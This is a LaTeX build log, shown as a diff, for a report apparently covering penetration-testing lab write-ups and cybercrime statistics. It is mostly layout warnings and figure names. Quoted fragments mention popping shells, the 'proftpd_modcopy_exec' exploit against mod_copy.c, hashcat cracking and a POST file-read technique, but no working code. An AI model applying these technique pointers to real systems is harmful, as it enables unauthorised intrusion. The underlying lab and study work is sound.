+(hyperref)                than one, level fixed on input line 9.
+
+[59]
+Overfull \hbox (135.3039pt too wide) in paragraph at lines 29--41
+ [][] 
+ []
+
+LaTeX Font Info:    Font shape `TU/LiberationMono(0)/m/n' will be
+(Font)              scaled to size 9.0pt on input line 46.
+[60]
+Overfull \hbox (103.57935pt too wide) in paragraph at lines 88--97
+ [][] 
+ []
+
+
+Overfull \hbox (54.04088pt too wide) in paragraph at lines 102--111
+ [][] 
+ []
+
+[61]
+Overfull \hbox (389.14662pt too wide) in paragraph at lines 124--137
+ [][] 
+ []
+
+[62] [63]
+Overfull \hbox (0.20786pt too wide) in paragraph at lines 181--182
+[]\TU/LiberationSerif(0)/m/n/10 One of the first questions we asked when we pop
+ped these shells was, Where
+ []
+
+
+Overfull \hbox (1.2023pt too wide) in paragraph at lines 184--185
+[]\TU/LiberationSerif(0)/m/n/10 We plinked around the system, particularly near
+ directories about passwords,
+ []
+
+
+Overfull \hbox (85.77173pt too wide) in paragraph at lines 192--200
+ [][] 
+ []
+
+
+Overfull \hbox (29.42662pt too wide) in paragraph at lines 205--212
+ [][] 
+ []
+
+
+Overfull \hbox (47.02739pt too wide) in paragraph at lines 217--218
+\TU/LiberationSerif(0)/m/n/10 config scripts. While hunting around in the Apach
+e access log near \TU/LiberationMono(0)/m/n/10 /var/log/apache2\TU/LiberationSe
+rif(0)/m/n/10 ,
+ []
+
+[64] [65]
+Overfull \hbox (29.40454pt too wide) in paragraph at lines 272--282
+ [][] 
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [66]
+Overfull \hbox (330.93053pt too wide) in paragraph at lines 287--295
+ [][] 
+ []
+
+[67]
+Overfull \hbox (242.5149pt too wide) in paragraph at lines 323--333
+ [][] 
+ []
+
+
+Overfull \hbox (304.53404pt too wide) in paragraph at lines 338--349
+ [][] 
+ []
+
+[68]
+Overfull \hbox (23.68376pt too wide) in paragraph at lines 362--362
+\TU/LiberationSerif(0)/m/n/10 One of the websites that mentioned it mentioned t
+o also comment out a \TU/LiberationMono(0)/m/n/10 mod_copy.c
+ []
+
+
+Overfull \hbox (222.60045pt too wide) in paragraph at lines 391--400
+ [][] 
+ []
+
+[69] [70]
+Overfull \hbox (24.11407pt too wide) in paragraph at lines 431--433
+\TU/LiberationSerif(0)/m/n/10 ments includes descriptions of vulnerability scan
+ning, penetration tes[]passwordssword
+ []
+
+[71] [72]
+Overfull \hbox (2.7572pt too wide) in paragraph at lines 473--475
+\TU/LiberationSerif(0)/m/n/10 Ganapathy, Lakshmanan. ”5 Linux Touch Command Exa
+mples (How to Change
+ []
+
+
+Overfull \hbox (41.71619pt too wide) in paragraph at lines 491--493
+\TU/LiberationSerif(0)/m/n/10 module to []exploit a vuln in \TU/LiberationMono(
+0)/m/n/10 mod_copy.c\TU/LiberationSerif(0)/m/n/10 . Exploit name is \TU/Liberat
+ionMono(0)/m/n/10 proftpd_modcopy_exec\TU/LiberationSerif(0)/m/n/10 . 
+ []
+
+[73] [74] [75]) (./chapters/bad_store.tex [76]
+Chapter 4.
+
+Overfull \hbox (1.37788pt too wide) in paragraph at lines 6--7
+\TU/LiberationSerif(0)/m/n/10 Throughout this post, we’ll reveal some aspects o
+f the ”Bad Store” target. Please
+ []
+
+
+Overfull \hbox (115.30878pt too wide) in paragraph at lines 21--33
+ [][] 
+ []
+
+
+Underfull \vbox (badness 5008) has occurred while \output is active []
+
+ [77
+
+]
+
+Package hyperref Warning: Difference (2) between bookmark levels is greater 
+(hyperref)                than one, level fixed on input line 36.
+
+[78]
+Overfull \hbox (37.87155pt too wide) in paragraph at lines 56--62
+ [][] 
+ []
+
+
+Overfull \hbox (5.8907pt too wide) in paragraph at lines 89--93
+[]\TU/LiberationSerif(0)/m/n/10 The Planning phase of the penetration testing m
+ethodology was almost nonex-
+ []
+
+[79]
+Overfull \hbox (0.33751pt too wide) in paragraph at lines 103--104
+\TU/LiberationSerif(0)/m/n/10 several OpenSSL-related vulnerabilities; that’s w
+hen we began to see how many
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [80]
+[81]
+Overfull \hbox (44.6858pt too wide) in paragraph at lines 177--180
+[]\TU/LiberationSerif(0)/m/n/10 The output showed a pattern like: \TU/Liberatio
+nMono(0)/m/n/10 <100X>:<USER>/<[]password>/<?OPTIONAL
+ []
+
+[82]
+Overfull \hbox (55.24205pt too wide) in paragraph at lines 206--217
+ [][] 
+ []
+
+
+Overfull \hbox (119.15552pt too wide) in paragraph at lines 222--233
+ [][] 
+ []
+
+[83]
+Overfull \hbox (1.26416pt too wide) in paragraph at lines 257--258
+[]\TU/LiberationSerif(0)/m/n/10 One more thing happened: when feeding hashes in
+ to \TU/LiberationMono(0)/m/n/10 hashcat\TU/LiberationSerif(0)/m/n/10 , they wo
+uld
+ []
+
+[84]
+Overfull \hbox (80.61803pt too wide) in paragraph at lines 287--297
+ [][] 
+ []
+
+[85]
+Overfull \hbox (327.70044pt too wide) in paragraph at lines 302--312
+ [][] 
+ []
+
+[86]
+Overfull \hbox (0.22023pt too wide) in paragraph at lines 327--327
+\TU/LiberationSerif(0)/m/n/10 on the target box. Most of these user-installatio
+n activities will involve a \TU/LiberationMono(0)/m/n/10 GRANT
+ []
+
+[87] [88]
+Overfull \hbox (35.78255pt too wide) in paragraph at lines 364--365
+[]\TU/LiberationSerif(0)/m/n/10 This kind of POST file read technique can be co
+mbine with the other \TU/LiberationMono(0)/m/n/10 --file-dest
+ []
+
+
+Overfull \hbox (413.43053pt too wide) in paragraph at lines 370--381
+ [][] 
+ []
+
+
+Overfull \hbox (78.02759pt too wide) in paragraph at lines 386--395
+ [][] 
+ []
+
+[89]
+Overfull \hbox (584.47545pt too wide) in paragraph at lines 423--432
+ [][] 
+ []
+
+
+Overfull \hbox (49.42896pt too wide) in paragraph at lines 437--446
+ [][] 
+ []
+
+
+Underfull \vbox (badness 1838) has occurred while \output is active []
+
+ [90]
+[91]
+Overfull \hbox (274.37779pt too wide) in paragraph at lines 470--480
+ [][] 
+ []
+
+
+Overfull \hbox (175.21509pt too wide) in paragraph at lines 485--493
+ [][] 
+ []
+
+[92]
+Overfull \hbox (8.47118pt too wide) in paragraph at lines 512--513
+[]\TU/LiberationSerif(0)/m/n/10 Review of techniques to implement Nessus scans,
+ <code>nmap</code> scans,
+ []
+
+[93]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [94]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [95]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [96])
+(./chapters/baseline_quantitative.tex [97] [98
+
+]
+Chapter 5.
+File: figures/Screenshot 2026-07-28 145652.png Graphic file (type bmp)
+<figures/Screenshot 2026-07-28 145652.png>
+[99]
+File: figures/Screenshot 2026-07-28 145609.png Graphic file (type bmp)
+<figures/Screenshot 2026-07-28 145609.png>
+ [100] [101] [102] [103] [104]
+File: figures/boxwhisker-tnpersdatabreach2016.png Graphic file (type bmp)
+<figures/boxwhisker-tnpersdatabreach2016.png>
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [105]
+[106] [107]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [108]
+
+Package hyperref Warning: Token not allowed in a PDF string (Unicode):
+(hyperref)                removing `\Gls' on input line 286.
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [109]
+
+Package hyperref Warning: Token not allowed in a PDF string (Unicode):
+(hyperref)                removing `\Gls' on input line 306.
+
+
+Overfull \hbox (3.30914pt too wide) in paragraph at lines 323--323
+ []|[]| 
+ []
+
+
+Overfull \hbox (4.35924pt too wide) in paragraph at lines 325--325
+ []|[]| 
+ []
+
+
+Overfull \hbox (3.72906pt too wide) in paragraph at lines 327--327
+ []|[]| 
+ []
+
+
+Overfull \hbox (5.59267pt too wide) in paragraph at lines 334--334
+ []|\TU/LiberationSerif(0)/m/n/10 52,245| 
+ []
+
+
+Overfull \hbox (10.59267pt too wide) in paragraph at lines 334--334
+ []|\TU/LiberationSerif(0)/m/n/10 177,746| 
+ []
+
+
+Overfull \hbox (18.09267pt too wide) in paragraph at lines 334--334
+ []|\TU/LiberationSerif(0)/m/n/10 6,646,010| 
+ []
+
+
+Overfull \hbox (16.83752pt too wide) in paragraph at lines 334--334
+ []|\TU/LiberationSerif(0)/m/n/10 39,149,186| 
+ []
+
+
+Overfull \hbox (5.59267pt too wide) in paragraph at lines 335--335
+ []|\TU/LiberationSerif(0)/m/n/10 51,586| 
+ []
+
+
+Overfull \hbox (10.59267pt too wide) in paragraph at lines 335--335
+ []|\TU/LiberationSerif(0)/m/n/10 179,530| 
+ []
+
+
+Overfull \hbox (18.09267pt too wide) in paragraph at lines 335--335
+ []|\TU/LiberationSerif(0)/m/n/10 6,708,799| 
+ []
+
+
+Overfull \hbox (16.83752pt too wide) in paragraph at lines 335--335
+ []|\TU/LiberationSerif(0)/m/n/10 39,337,785| 
+ []
+
+
+Overfull \hbox (5.59267pt too wide) in paragraph at lines 336--336
+ []|\TU/LiberationSerif(0)/m/n/10 50,908| 
+ []
+
+
+Overfull \hbox (10.59267pt too wide) in paragraph at lines 336--336
+ []|\TU/LiberationSerif(0)/m/n/10 181,918| 
+ []
+
+
+Overfull \hbox (18.09267pt too wide) in paragraph at lines 336--336
+ []|\TU/LiberationSerif(0)/m/n/10 6,771,631| 
+ []
+
+
+Overfull \hbox (16.83752pt too wide) in paragraph at lines 336--336
+ []|\TU/LiberationSerif(0)/m/n/10 39,437,463| 
+ []
+
+
+Overfull \hbox (5.59267pt too wide) in paragraph at lines 337--337
+ []|\TU/LiberationSerif(0)/m/n/10 50,209| 
+ []
+
+
+Overfull \hbox (10.59267pt too wide) in paragraph at lines 337--337
+ []|\TU/LiberationSerif(0)/m/n/10 182,799| 
+ []
+
+
+Overfull \hbox (18.09267pt too wide) in paragraph at lines 337--337
+ []|\TU/LiberationSerif(0)/m/n/10 6,829,174| 
+ []
+
+
+Overfull \hbox (16.83752pt too wide) in paragraph at lines 337--337
+ []|\TU/LiberationSerif(0)/m/n/10 39,437,610| 
+ []
+
+
+Overfull \hbox (5.59267pt too wide) in paragraph at lines 338--338
+ []|\TU/LiberationSerif(0)/m/n/10 49,751| 
+ []
+
+
+Overfull \hbox (10.59267pt too wide) in paragraph at lines 338--338
+ []|\TU/LiberationSerif(0)/m/n/10 181,560| 
+ []
+
+
+Overfull \hbox (18.09267pt too wide) in paragraph at lines 338--338
+ []|\TU/LiberationSerif(0)/m/n/10 6,925,619| 
+ []
+
+
+Overfull \hbox (16.83752pt too wide) in paragraph at lines 338--338
+ []|\TU/LiberationSerif(0)/m/n/10 39,538,223| 
+ []
+
+
+Overfull \hbox (5.59267pt too wide) in paragraph at lines 339--339
+ []|\TU/LiberationSerif(0)/m/n/10 49,225| 
+ []
+
+
+Overfull \hbox (10.59267pt too wide) in paragraph at lines 339--339
+ []|\TU/LiberationSerif(0)/m/n/10 181,163| 
+ []
+
+
+Overfull \hbox (18.09267pt too wide) in paragraph at lines 339--339
+ []|\TU/LiberationSerif(0)/m/n/10 6,968,351| 
+ []
+
+
+Overfull \hbox (16.83752pt too wide) in paragraph at lines 339--339
+ []|\TU/LiberationSerif(0)/m/n/10 39,152,927| 
+ []
+
+
+Overfull \hbox (5.59267pt too wide) in paragraph at lines 340--340
+ []|\TU/LiberationSerif(0)/m/n/10 48,342| 
+ []
+
+
+Overfull \hbox (10.59267pt too wide) in paragraph at lines 340--340
+ []|\TU/LiberationSerif(0)/m/n/10 184,086| 
+ []
+
+
+Overfull \hbox (18.09267pt too wide) in paragraph at lines 340--340
+ []|\TU/LiberationSerif(0)/m/n/10 7,051,339| 
+ []
+
+
+Overfull \hbox (16.83752pt too wide) in paragraph at lines 340--340
+ []|\TU/LiberationSerif(0)/m/n/10 39,125,347| 
+ []
+
+
+Overfull \hbox (1.87938pt too wide) in paragraph at lines 311--344
+[][] 
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [110]
+Overfull \hbox (2.78032pt too wide) in paragraph at lines 359--360
+ []|\TU/LiberationSerif(0)/m/n/10 Year| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 366--366
+ []|\TU/LiberationSerif(0)/m/n/10 2016| 
+ []
+
+
+Overfull \hbox (1.01274pt too wide) in paragraph at lines 366--367
+ []|\TU/LiberationSerif(0)/m/n/10 [36]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 367--367
+ []|\TU/LiberationSerif(0)/m/n/10 2017| 
+ []
+
+
+Overfull \hbox (1.01274pt too wide) in paragraph at lines 367--368
+ []|\TU/LiberationSerif(0)/m/n/10 [37]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 368--368
+ []|\TU/LiberationSerif(0)/m/n/10 2018| 
+ []
+
+
+Overfull \hbox (1.01274pt too wide) in paragraph at lines 368--369
+ []|\TU/LiberationSerif(0)/m/n/10 [38]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 369--369
+ []|\TU/LiberationSerif(0)/m/n/10 2019| 
+ []
+
+
+Overfull \hbox (1.01274pt too wide) in paragraph at lines 369--370
+ []|\TU/LiberationSerif(0)/m/n/10 [39]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 370--370
+ []|\TU/LiberationSerif(0)/m/n/10 2020| 
+ []
+
+
+Overfull \hbox (1.01274pt too wide) in paragraph at lines 370--371
+ []|\TU/LiberationSerif(0)/m/n/10 [40]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 371--371
+ []|\TU/LiberationSerif(0)/m/n/10 2021| 
+ []
+
+
+Overfull \hbox (1.01274pt too wide) in paragraph at lines 371--372
+ []|\TU/LiberationSerif(0)/m/n/10 [41]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 372--372
+ []|\TU/LiberationSerif(0)/m/n/10 2022| 
+ []
+
+
+Overfull \hbox (1.01274pt too wide) in paragraph at lines 372--373
+ []|\TU/LiberationSerif(0)/m/n/10 [42]| 
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [111]
+[112]
+Underfull \hbox (badness 10000) in paragraph at lines 410--412
+
+ []
+
+
+Overfull \hbox (5.90962pt too wide) detected at line 450
+[] \OT1/cmr/m/n/10 = [] \OML/cmm/m/it/10 :
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 454--456
+
+ []
+
+File: figures/binary_dataBreach_count.png Graphic file (type bmp)
+<figures/binary_dataBreach_count.png>
+[113]
+File: figures/histogram_dataBreach_impact.png Graphic file (type bmp)
+<figures/histogram_dataBreach_impact.png>
+File: figures/percent_dataBreach_impact.png Graphic file (type bmp)
+<figures/percent_dataBreach_impact.png>
+
+Underfull \vbox (badness 5431) has occurred while \output is active []
+
+ [114]
+[115]
+Underfull \hbox (badness 10000) in paragraph at lines 551--553
+
+ []
+
+
+Overfull \hbox (44.24307pt too wide) detected at line 590
+[] \OT1/cmr/m/n/10 = [] \OML/cmm/m/it/10 :
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 594--596
+
+ []
+
+File: figures/discrete_persDataBreach_count.png Graphic file (type bmp)
+<figures/discrete_persDataBreach_count.png>
+[116]
+Overfull \hbox (15.4246pt too wide) in paragraph at lines 626--698
+ [] 
+ []
+
+
+Overfull \hbox (15.4246pt too wide) in paragraph at lines 626--698
+ [] 
+ []
+
+
+Overfull \hbox (15.4246pt too wide) in paragraph at lines 626--698
+ [] 
+ []
+
+
+Overfull \hbox (15.4246pt too wide) in paragraph at lines 626--698
+ [] 
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [117]
+File: figures/histogram_persDataBreach_impact.png Graphic file (type bmp)
+<figures/histogram_persDataBreach_impact.png>
+File: figures/percent_persDataBreach_impact.png Graphic file (type bmp)
+<figures/percent_persDataBreach_impact.png>
+
+[118]
+Overfull \hbox (2.78032pt too wide) in paragraph at lines 734--735
+ []|\TU/LiberationSerif(0)/m/n/10 Year| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 742--742
+ []|\TU/LiberationSerif(0)/m/n/10 2016| 
+ []
+
+
+Overfull \hbox (1.01274pt too wide) in paragraph at lines 742--743
+ []|\TU/LiberationSerif(0)/m/n/10 [55]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 743--743
+ []|\TU/LiberationSerif(0)/m/n/10 2017| 
+ []
+
+
+Overfull \hbox (1.01274pt too wide) in paragraph at lines 743--744
+ []|\TU/LiberationSerif(0)/m/n/10 [56]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 744--744
+ []|\TU/LiberationSerif(0)/m/n/10 2018| 
+ []
+
+
+Overfull \hbox (1.01274pt too wide) in paragraph at lines 744--745
+ []|\TU/LiberationSerif(0)/m/n/10 [57]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 745--745
+ []|\TU/LiberationSerif(0)/m/n/10 2019| 
+ []
+
+
+Overfull \hbox (1.01274pt too wide) in paragraph at lines 745--746
+ []|\TU/LiberationSerif(0)/m/n/10 [58]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 746--746
+ []|\TU/LiberationSerif(0)/m/n/10 2020| 
+ []
+
+
+Overfull \hbox (1.01274pt too wide) in paragraph at lines 746--747
+ []|\TU/LiberationSerif(0)/m/n/10 [59]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 747--747
+ []|\TU/LiberationSerif(0)/m/n/10 2021| 
+ []
+
+
+Overfull \hbox (1.01274pt too wide) in paragraph at lines 747--748
+ []|\TU/LiberationSerif(0)/m/n/10 [60]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 748--748
+ []|\TU/LiberationSerif(0)/m/n/10 2022| 
+ []
+
+
+Overfull \hbox (1.01274pt too wide) in paragraph at lines 748--749
+ []|\TU/LiberationSerif(0)/m/n/10 [61]| 
+ []
+
+
+Overfull \hbox (7.06252pt too wide) in paragraph at lines 728--752
+[][] 
+ []
+
+[119]
+Underfull \hbox (badness 10000) in paragraph at lines 782--784
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 825--827
+
+ []
+
+File: figures/binary_malware_count.png Graphic file (type bmp)
+<figures/binary_malware_count.png>
+[120]
+File: figures/histogram_malware_impact_v2.png Graphic file (type bmp)
+<figures/histogram_malware_impact_v2.png>
+File: figures/percent_malware_impact_v2.png Graphic file (type bmp)
+<figures/percent_malware_impact_v2.png>
+
+Underfull \vbox (badness 1325) has occurred while \output is active []
+
+ [121]
+[122]
+Underfull \hbox (badness 10000) in paragraph at lines 923--925
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 966--968
+
+ []
+
+File: figures/discrete_phishing_count.png Graphic file (type bmp)
+<figures/discrete_phishing_count.png>
+[123]
+File: figures/histogram_phishing_impact.png Graphic file (type bmp)
+<figures/histogram_phishing_impact.png>
+File: figures/percent_phishing_impact.png Graphic file (type bmp)
+<figures/percent_phishing_impact.png>
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [124]
+[125]
+Underfull \hbox (badness 10000) in paragraph at lines 1095--1097
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 1138--1140
+
+ []
+
+File: figures/histogram_ransomware.png Graphic file (type bmp)
+<figures/histogram_ransomware.png>
+[126]
+File: figures/count_ransomware_percentile.png Graphic file (type bmp)
+<figures/count_ransomware_percentile.png>
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [127]
+File: figures/histogram_ransomware_impact.png Graphic file (type bmp)
+<figures/histogram_ransomware_impact.png>
+File: figures/percent_ransomware_impact.png Graphic file (type bmp)
+<figures/percent_ransomware_impact.png>
+
+Underfull \vbox (badness 4168) has occurred while \output is active []
+
+ [128]
+Overfull \hbox (2.78032pt too wide) in paragraph at lines 1205--1205
+ []|\TU/LiberationSerif(0)/m/n/10 Year| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 1211--1211
+ []|\TU/LiberationSerif(0)/m/n/10 2016| 
+ []
+
+
+Overfull \hbox (1.01274pt too wide) in paragraph at lines 1211--1212
+ []|\TU/LiberationSerif(0)/m/n/10 [82]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 1212--1212
+ []|\TU/LiberationSerif(0)/m/n/10 2017| 
+ []
+
+
+Overfull \hbox (1.01274pt too wide) in paragraph at lines 1212--1213
+ []|\TU/LiberationSerif(0)/m/n/10 [83]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 1213--1213
+ []|\TU/LiberationSerif(0)/m/n/10 2018| 
+ []
+
+
+Overfull \hbox (1.01274pt too wide) in paragraph at lines 1213--1214
+ []|\TU/LiberationSerif(0)/m/n/10 [84]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 1214--1214
+ []|\TU/LiberationSerif(0)/m/n/10 2019| 
+ []
+
+
+Overfull \hbox (1.01274pt too wide) in paragraph at lines 1214--1215
+ []|\TU/LiberationSerif(0)/m/n/10 [85]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 1215--1215
+ []|\TU/LiberationSerif(0)/m/n/10 2020| 
+ []
+
+
+Overfull \hbox (1.01274pt too wide) in paragraph at lines 1215--1216
+ []|\TU/LiberationSerif(0)/m/n/10 [86]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 1216--1216
+ []|\TU/LiberationSerif(0)/m/n/10 2021| 
+ []
+
+
+Overfull \hbox (1.01274pt too wide) in paragraph at lines 1216--1217
+ []|\TU/LiberationSerif(0)/m/n/10 [87]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 1217--1217
+ []|\TU/LiberationSerif(0)/m/n/10 2022| 
+ []
+
+
+Overfull \hbox (1.01274pt too wide) in paragraph at lines 1217--1218
+ []|\TU/LiberationSerif(0)/m/n/10 [88]| 
+ []
+
+
+Overfull \hbox (7.06252pt too wide) in paragraph at lines 1198--1221
+ [] 
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [129]
+[130]
+Underfull \hbox (badness 10000) in paragraph at lines 1257--1259
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 1304--1306
+
+ []
+
+File: figures/discrete_children_count.png Graphic file (type bmp)
+<figures/discrete_children_count.png>
+[131]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [132]
+File: figures/histogram_children_impact.png Graphic file (type bmp)
+<figures/histogram_children_impact.png>
+File: figures/percent_children_impact.png Graphic file (type bmp)
+<figures/percent_children_impact.png>
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [133]
+[134]
+Underfull \hbox (badness 10000) in paragraph at lines 1401--1403
+
+ []
+
+
+Overfull \hbox (7.57642pt too wide) detected at line 1440
+[] \OT1/cmr/m/n/10 = [] \OML/cmm/m/it/10 :
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 1444--1446
+
+ []
+
+File: figures/discrete_extortion_count.png Graphic file (type bmp)
+<figures/discrete_extortion_count.png>
+[135]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [136]
+File: figures/histogram_extortion_impact.png Graphic file (type bmp)
+<figures/histogram_extortion_impact.png>
+File: figures/percent_extortion_impact.png Graphic file (type bmp)
+<figures/percent_extortion_impact.png>
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [137]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [138]
+Underfull \hbox (badness 10000) in paragraph at lines 1626--1628
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 1669--1671
+
+ []
+
+File: figures/discrete_threats_percentile.png Graphic file (type bmp)
+<figures/discrete_threats_percentile.png>
+[139]
+File: figures/histogram_threat_impact.png Graphic file (type bmp)
+<figures/histogram_threat_impact.png>
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [140]
+File: figures/percent_threats_impact.png Graphic file (type bmp)
+<figures/percent_threats_impact.png>
+
+Overfull \hbox (2.78032pt too wide) in paragraph at lines 1762--1762
+ []|\TU/LiberationSerif(0)/m/n/10 Year| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 1765--1765
+ []|\TU/LiberationSerif(0)/m/n/10 2016| 
+ []
+
+
+Overfull \hbox (6.01274pt too wide) in paragraph at lines 1765--1766
+ []|\TU/LiberationSerif(0)/m/n/10 [107]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 1766--1766
+ []|\TU/LiberationSerif(0)/m/n/10 2017| 
+ []
+
+
+Overfull \hbox (6.01274pt too wide) in paragraph at lines 1766--1767
+ []|\TU/LiberationSerif(0)/m/n/10 [108]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 1767--1767
+ []|\TU/LiberationSerif(0)/m/n/10 2018| 
+ []
+
+
+Overfull \hbox (6.01274pt too wide) in paragraph at lines 1767--1768
+ []|\TU/LiberationSerif(0)/m/n/10 [109]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 1768--1768
+ []|\TU/LiberationSerif(0)/m/n/10 2019| 
+ []
+
+
+Overfull \hbox (5.64165pt too wide) in paragraph at lines 1768--1769
+ []|\TU/LiberationSerif(0)/m/n/10 [110]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 1769--1769
+ []|\TU/LiberationSerif(0)/m/n/10 2020| 
+ []
+
+
+Overfull \hbox (5.27055pt too wide) in paragraph at lines 1769--1770
+ []|\TU/LiberationSerif(0)/m/n/10 [111]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 1770--1770
+ []|\TU/LiberationSerif(0)/m/n/10 2021| 
+ []
+
+
+Overfull \hbox (5.64165pt too wide) in paragraph at lines 1770--1771
+ []|\TU/LiberationSerif(0)/m/n/10 [112]| 
+ []
+
+
+Overfull \hbox (4.35258pt too wide) in paragraph at lines 1771--1771
+ []|\TU/LiberationSerif(0)/m/n/10 2022| 
+ []
+
+
+Overfull \hbox (5.64165pt too wide) in paragraph at lines 1771--1772
+ []|\TU/LiberationSerif(0)/m/n/10 [113]| 
+ []
+
+
+Overfull \hbox (7.06252pt too wide) in paragraph at lines 1755--1775
+[][] 
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [141]
+[142]
+
+Package hyperref Warning: Token not allowed in a PDF string (Unicode):
+(hyperref)                removing `\gls' on input line 1779.
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 1809--1811
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 1858--1860
+
+ []
+
+File: figures/binary_ipr_count.png Graphic file (type bmp)
+<figures/binary_ipr_count.png>
+[143]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [144]
+File: figures/histogram_ipr_impact_binary.png Graphic file (type bmp)
+<figures/histogram_ipr_impact_binary.png>
+File: figures/percent_ipr_impact_binary.png Graphic file (type bmp)
+<figures/percent_ipr_impact_binary.png>
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [145]
+[146]
+Underfull \hbox (badness 10000) in paragraph at lines 1998--2000
+
+ []
+
+
+Overfull \hbox (5.90962pt too wide) detected at line 2038
+[] \OT1/cmr/m/n/10 = [] \OML/cmm/m/it/10 :
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2042--2044
+
+ []
+
+File: figures/discrete_idtheft_count.png Graphic file (type bmp)
+<figures/discrete_idtheft_count.png>
+[147]
+Overfull \hbox (15.4246pt too wide) in paragraph at lines 2074--2121
+ [] 
+ []
+
+File: figures/histogram_idtheft_impact.png Graphic file (type bmp)
+<figures/histogram_idtheft_impact.png>
+File: figures/percent_idtheft_impact.png Graphic file (type bmp)
+<figures/percent_idtheft_impact.png>
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [148]
+[149]
+Underfull \hbox (badness 10000) in paragraph at lines 2173--2175
+
+ []
+
+
+Overfull \hbox (2.02084pt too wide) detected at line 2212
+[] \OT1/cmr/m/n/10 = [] \OML/cmm/m/it/10 :
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2216--2218
+
+ []
+
+File: figures/discrete_bec_count.png Graphic file (type bmp)
+<figures/discrete_bec_count.png>
+[150]
+File: figures/histogram_bec_impact.png Graphic file (type bmp)
+<figures/histogram_bec_impact.png>
+File: figures/percent_bec_impact.png Graphic file (type bmp)
+<figures/percent_bec_impact.png>
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [151]
+Underfull \vbox (badness 1043) has occurred while \output is active []
+
+ [152]
+Underfull \hbox (badness 10000) in paragraph at lines 2351--2351
+[]|\TU/LiberationSerif(0)/m/n/9 Threats/Stalking/Harassment/
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2377--2377
+[]|\TU/LiberationSerif(0)/m/n/9 Threats/Stalking/Harassment/
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [153]
+Underfull \hbox (badness 10000) in paragraph at lines 2429--2429
+[]|\TU/LiberationSerif(0)/m/n/9 Threats/Stalking/Harassment/
+ []
+
+
+Underfull \vbox (badness 2221) has occurred while \output is active []
+
+ [154]
+Underfull \hbox (badness 10000) in paragraph at lines 2455--2455
+[]|\TU/LiberationSerif(0)/m/n/9 Threats/Stalking/Harassment/
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [155]
